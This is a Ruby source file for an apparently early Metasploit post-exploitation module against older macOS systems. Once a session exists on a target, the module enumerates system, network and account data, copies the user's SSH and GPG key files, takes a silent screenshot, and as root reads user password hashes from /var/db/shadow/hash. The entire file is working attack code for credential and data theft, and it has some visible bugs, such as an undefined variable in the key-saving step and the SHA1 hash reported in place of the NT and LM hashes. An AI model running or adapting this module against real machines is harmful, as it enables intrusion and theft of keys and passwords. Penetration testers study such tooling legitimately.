##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Auxiliary::Report 

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'NAME',
				'Description'   => %q{ Post Exploitaio module to do initial gathering of information out of an OSX Tiger, Leopard and Snow Leopard System},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'osx' ],
				'SessionTypes'  => [ "shell" ]
			))

	end

	# Run Method for when run command is issued
	def run
		case session.type
		when /meterpreter/
			host = sysinfo["Computer"]
		when /shell/
			host = session.shell_command_token("hostname").chomp
		end
		print_status("Running module against #{host}")
		running_root = check_root
		if running_root
			print_status("This session is running as root!")
		end
		ver_num = get_ver
		log_folder = log_folder_create()
		enum_conf(log_folder)
		enum_accounts(log_folder, ver_num)
		get_crypto_keys(log_folder)
		screenshot(log_folder, ver_num)
		dump_hash(log_folder,ver_num) if running_root
	end

	# Function for creating the folder for gathered data
	def log_folder_create(log_path = nil)
		#Get hostname
		case session.type
		when /meterpreter/
			host = Rex::FileUtils.clean_path(sysinfo["Computer"])
		when /shell/
			host = Rex::FileUtils.clean_path(session.shell_command_token("hostname").chomp)
		end

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', "enum_osx", host + filenameinfo )
		else
			logs = ::File.join(Msf::Config.log_directory, "post", "enum_osx", host + filenameinfo )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)
		return logs
	end

	# Checks if running as root on the target
	def check_root
		# Get only the account ID
		case session.type
		when /shell/
			id = session.shell_command_token("/usr/bin/id -ru").chomp
		when /meterpreter/
			id = cmd_exec("/usr/bin/id","-ru").chomp
		end
		if id == "0"
			return true
		else
			return false
		end
	end

	# Checks if the target is OSX Server
	def check_server
		# Get the OS Name
		case session.type
		when /meterpreter/
			osx_ver = cmd_exec("/usr/bin/sw_vers", "-productName").chomp
		when /shell/
			osx_ver = session.shell_command_token("/usr/bin/sw_vers -productName").chomp
		end
		if osx_ver =~/Server/
			return true
		else
			return false
		end
	end

	# Enumerate the OS Version
	def get_ver
		# Get the OS Version
		case session.type
		when /meterpreter/
			osx_ver_num = cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
		when /shell/
			osx_ver_num = session.shell_command_token("/usr/bin/sw_vers -productVersion").chomp
		end

		if osx_ver_num =~ /10\.(6|5)\.\d/
			ver = "L"
		else
			ver = "T"
		end

		return osx_ver_num
	end

	def enum_conf(log_folder)
		platform_type = session.platform
		session_type = session.type
		profile_datatypes = {"OS" => "SPSoftwareDataType",
			"Network" => "SPNetworkDataType",
			"Bluetooth" => "SPBluetoothDataType",
			"Ethernet" => "SPEthernetDataType",
			"Printers" => "SPPrintersDataType",
			"USB" => "SPUSBDataType",
			"Airport" => "SPAirPortDataType",
			"Firewall" => "SPFirewallDataType",
			"KnownNetworks" => "SPNetworkLocationDataType",
			"Applications" => "SPApplicationsDataType",
			"DevelopmentTools" => "SPDeveloperToolsDataType",
			"Frameworks" => "SPFrameworksDataType",
			"Logs" => "SPLogsDataType",
			"PreferencePanes" => "SPPrefPaneDataType",
			"StartUp" => "SPStartupItemDataType"}
		shell_commands = {
			"TCP Connections" => ["/usr/sbin/netstat","-np tcp"],
			"UDP Connections" => ["/usr/sbin/netstat","-np udp"],
			"Enviroment Variables" => ["/usr/bin/printenv",""],
			"Last Boottime" => ["/usr/bin/who","-b"],
			"Current Activity" => ["/usr/bin/who",""],
			"Process List" => ["/bin/ps","-ea"]
		}

		print_status("Saving all data to #{log_folder}")

		# Enumerate first using System Profiler
		profile_datatypes.each do |name,profile_datatypes|
			print_status("\tEnumerating #{name}")

			# Run commands according to the session type
			
				if session_type =~ /meterpreter/

					returned_data = cmd_exec("system_profiler",profile_datatypes)

					# Save data lo log folder
					file_local_write(log_folder+"//#{name}.txt",returned_data)
				elsif session_type =~ /shell/
					begin
						returned_data = session.shell_command_token("/usr/sbin/system_profiler #{profile_datatypes}",15)

						# Save data lo log folder
						file_local_write(log_folder+"//#{name}.txt",returned_data)
					rescue
					end
				end
		end

		# Enumerate using system commands
		shell_commands.each do |name, command|
			print_status("\tEnumerating #{name}")

			# Run commands according to the session type
			begin
				if session_type =~ /meterpreter/

					command_output = cmd_exec(command[0],command[1])

					# Save data lo log folder
					file_local_write(log_folder+"//#{name}.txt",command_output)

				elsif session_type =~ /shell/

					command_output = session.shell_command_token(command.join(" "),15)

					# Save data lo log folder
					file_local_write(log_folder+"//#{name}.txt",command_output)
				end
			rescue
				print_error("failed to run #{name}")
			end
		end
	end


	def enum_accounts(log_folder,ver_num)

		# Specific commands for Leopard and Snow Leopard
		leopard_commands = {
			"Users" => ["/usr/bin/dscacheutil","-q user"],
			"Groups" => ["/usr/bin/dscacheutil","-q group"]

			}

		# Specific commands for Tiger
		tiger_commands = {
			"Users" => ["/usr/sbin/lookupd","-q user"],
			"Groups" => ["/usr/sbin/lookupd","-q group"]

			}
		if ver_num =~ /10\.(6|5)\.\d/
			shell_commands = leopard_commands
		else
			shell_commands = tiger_commands
		end
		shell_commands.each do |name, command|
			print_status("\tEnumerating #{name}")

			# Run commands according to the session type
			if session.type =~ /meterpreter/

				command_output = cmd_exec(command[0],command[1])

				# Save data lo log folder
				file_local_write(log_folder+"//#{name}.txt",command_output)

			elsif session.type =~ /shell/

				command_output = session.shell_command_token(command.join(" "),15)

				# Save data lo log folder
				file_local_write(log_folder+"//#{name}.txt",command_output)
			end
		end

	end


	# Method for getting SSH and GPG Keys
	def get_crypto_keys(log_folder)

		# Run commands according to the session type
		if session.type =~ /shell/

			# Enumerate and retreave files according to privilege level
			if not check_root

				# Enumerate the home folder content
				home_folder_list = session.shell_command_token("/bin/ls -ma ~/").chomp.split(", ")

				# Check for SSH folder and extract keys if found
				if home_folder_list.include?("\.ssh")
					print_status(".ssh Folder is present")
					ssh_folder = session.shell_command_token("/bin/ls -ma ~/.ssh").chomp.split(", ")
					ssh_folder.each do |k|
						next if k =~/^\.$|^\.\.$/
						print_status("\tDownloading #{k.strip}")
						ssh_file_content = session.shell_command_token("/bin/cat ~/.ssh/#{k}")

						# Save data lo log folder
						file_local_write(log_folder+"//#{name}",ssh_file_content)
					end
				end

				# Check for GPG and extract keys if found
				if home_folder_list.include?("\.gnupg")
					print_status(".gnupg Folder is present")
					gnugpg_folder = session.shell_command_token("/bin/ls -ma ~/.gnupg").chomp.split(", ")
					gnugpg_folder.each do |k|
						next if k =~/^\.$|^\.\.$/
						print_status("\tDownloading #{k.strip}")
						gpg_file_content = session.shell_command_token("/bin/cat ~/.gnupg/#{k.strip}")

						# Save data lo log folder
						file_local_write(log_folder+"//#{name}",gpg_file_content)
					end
				end
			end
		end
	end

	# Method  for capturing screenshot of targets
	def screenshot(log_folder, ver_num)
		if ver_num =~ /10\.(6|5)\.\d/
			print_status("Capturing screenshot")

			# Run commands according to the session type
			if session.type =~ /shell/
				session.shell_command_token("/usr/sbin/screencapture -x /tmp/screenshot.jpg")
				file_local_write(log_folder+"//screenshot.jpg",
					session.shell_command_token("/bin/cat /tmp/screenshot.jpg"))
				session.shell_command_token("/bin/rm /tmp/screenshot.jpg")
				print_status("Screenshot Captured")
			end
		end
	end

	# Dump SHA1 Hashes used by OSX, must be root to get the Hashes
	def dump_hash(log_folder,ver_num)
		print_status("Dumping Hashes")
		users = []
		host,port = session.tunnel_peer.split(':')
		case session.type
		when /meterpreter/
			users_folder = cmd_exec("/bin/ls","/Users")
		when /shell/
			users_folder = session.shell_command_token("/bin/ls /Users")
		end
		users_folder.each_line do |u|
			next if u.chomp =~ /Shared|\.localized/
			users << u.chomp
		end

		# Path to files with hashes
		nt_file = ::File.join(log_folder,"nt_hash.txt")
		lm_file = ::File.join(log_folder,"lm_hash.txt")
		sha1_file = ::File.join(log_folder,"sha1_hash.txt")

		# Process each user
		users.each do |user|
			if ver_num =~ /10\.(6|5)\.\d/
				case session.type
				when /meterpreter/
					guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
				when /shell/
					guid = session.shell_command_token("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
				end
			elsif ver_num =~ /10\.(4|3)\.\d/
				case session.type
				when /meterpreter/
					guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
				when /shell/
					guid = session.shell_command_token("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
				end
			end

			# Extract the hashes
			case session.type
			when /meterpreter/
				sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
				nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
				lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
			when /shell/
				sha1_hash = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
				nt_hash   = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
				lm_hash   = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
			end

			# Check that we have the hashes and save them
			if sha1_hash !~ /00000000000000000000000000000000/
				print_status("\tSHA1:#{user}:#{sha1_hash}")
				file_local_write(sha1_file,"#{user}:#{sha1_hash}")
				report_hash = {
					:host   => host,
					:port   => 0,
					:sname  => 'sha1',
					:user   => user,
					:pass   => sha1_hash,
					:active => false
				}
			end

			if nt_hash !~ /000000000000000/
				print_status("\tNT:#{user}:#{nt_hash}")
				file_local_write(nt_file,"#{user}:#{nt_hash}")
				report_hash = {
					:host   => host,
					:port   => 445,
					:sname  => 'smb',
					:user   => user,
					:pass   => sha1_hash,
					:active => true
				}
			end
			if lm_hash !~ /0000000000000/
				print_status("\tLM:#{user}:#{lm_hash}")
				file_local_write(lm_file,"#{user}:#{lm_hash}")
				report_hash = {
					:host   => host,
					:port   => 445,
					:sname  => 'smb',
					:user   => user,
					:pass   => sha1_hash,
					:active => true
				}
			end
		end
	end
end
